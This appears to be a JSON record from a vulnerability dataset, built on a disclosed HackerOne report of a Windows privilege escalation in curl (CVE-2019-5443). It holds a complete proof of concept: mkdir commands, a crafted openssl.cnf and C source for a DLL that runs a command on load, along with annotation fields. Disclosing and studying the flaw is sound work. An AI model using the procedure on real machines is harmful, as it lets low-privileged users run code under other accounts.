{
  "reported_to": "curl",
  "reported_by": "mirchr ",
  "title": "CVE-2019-5443: Windows Privilege Escalation: Malicious OpenSSL Engine",
  "content": "\nSummary:\nThe curl windows binaries are built with OpenSSL libraries and have an insecure path for the OPENSSLDIR build parameter. This path is set to c:\\usr\\local\\ssl. When curl is executed it attempts to load openssl.cnf from this path. By default on windows, low privileged users have the authority to create folders under c:. A low privileged user can create a custom openssl.cnf file to load a malicious OpenSSL Engine(library). The result is arbitrary code execution with the full authority of the account executing the curl binary.\nVersion tested.\ncurl-7.65.1_1-win64\nOS:\nWindows 10\nSteps To Reproduce:\nAll steps are executed as a low privileged(non-admin) user unless otherwise noted\nAs a low privileged user create the following folder c:\\usr\\local\\ssl\nCode 54 Bytes\n1mkdir c:\\usr\n2mkdir c:\\usr\\local\n3mkdir c:\\usr\\local\\ssl\nCreate an openssl.cnf file with the following contents.\nCode 180 Bytes\n1openssl_conf = openssl_init\n2[openssl_init]\n3engines = engine_section\n4[engine_section]\n5woot = woot_section\n6[woot_section]\n7engine_id = woot\n8dynamic_path = c:\\\\stage\\\\calc.dll\n9init = 0\nCreate the c:\\stage folder\nCode 14 Bytes\n1mkdir c:\\stage\nCreate and compile a malicious OpenSSL Engine library. For this PoC we will execute the Windows calculator.\nCode 1.23 KiB\n1/* Cross Compile with\n2   x86_64-w64-mingw32-g++ calc.c -o calc.dll -shared\n3*/\n4#include <windows.h>\n5BOOL WINAPI DllMain(\n6    HINSTANCE hinstDLL,\n7    DWORD fdwReason,\n8    LPVOID lpReserved )\n9{\n10    switch( fdwReason )\n11    {\n12        case DLL_PROCESS_ATTACH:\n13            system(\"calc\");\n14            break;\n15        case DLL_THREAD_ATTACH:\n16         // Do thread-specific initialization.\n17            break;\n18        case DLL_THREAD_DETACH:\n19         // Do thread-specific cleanup.\n20            break;\n21        case DLL_PROCESS_DETACH:\n22         // Perform any necessary cleanup.\n23            break;\n24    }\n25    return TRUE;  // Successful DLL_PROCESS_ATTACH.\n26}\n27```\n28\n29 5. Copy calc.dll to c:\\stage\n30`\n31copy calc.dll c:\\stage\n32`\n33 6. Execute curl.exe as a different user.\n34\n35## Supporting Material/References:\n36  * PoC image showing curl loading a custom calc.dll and executing calc.exe\n37{F507228}\n38\n39## Impact\n40\n41A malicious local user(or potentially malware) with access to a Windows workstation or server with curl installed has the ability to silently plant a custom OpenSSL Engine library that contains arbitrary code. Every time curl is executed this library will be loaded and the code executed with the full authority of the account executing it resulting in the elevation of privileges.\n\n",
  "severity": [
    7.8,
    null
  ],
  "bounty": 200,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1561847040,
  "report_url": "https://hackerone.com/reports/608577",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create the folder structure: c:\\usr\\local\\ssl"
    ],
    [
      2,
      "Create a malicious openssl.cnf file in c:\\usr\\local\\ssl with engine configuration pointing to a custom DLL"
    ],
    [
      3,
      "Create a folder c:\\stage and place a malicious DLL (e.g., calc.dll) there"
    ],
    [
      4,
      "Execute curl.exe as a different user to trigger the malicious DLL loading"
    ]
  ],
  "vuln_description": "The vulnerability allows privilege escalation on Windows systems where curl is installed. A low-privileged user can create a custom openssl.cnf file in a default insecure path (c:\\usr\\local\\ssl) that loads a malicious OpenSSL Engine DLL. When curl is executed by another user (including higher-privileged accounts), the malicious code runs with the executing user's privileges.",
  "reason": "While the attack involves multiple components (folder creation, config file crafting, DLL creation), each step is straightforward and well-documented in OpenSSL's configuration syntax. The interaction between curl's OpenSSL path and Windows permissions is non-obvious but follows predictable patterns once understood. The attack doesn't require complex state manipulation or novel logic.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves the insecure path configuration in curl's OpenSSL library loading mechanism on Windows, which allows a low-privileged user to inject a malicious DLL. This is a local privilege escalation issue and does not involve the web-based authentication or authorization mechanisms (AuthN/AuthZ) that the methodologies described are designed to detect. The methodologies focus on HTTP requests and session manipulation within a web application context, not local system operations or library loading behaviors.",
    "is_detectable": false
  }
}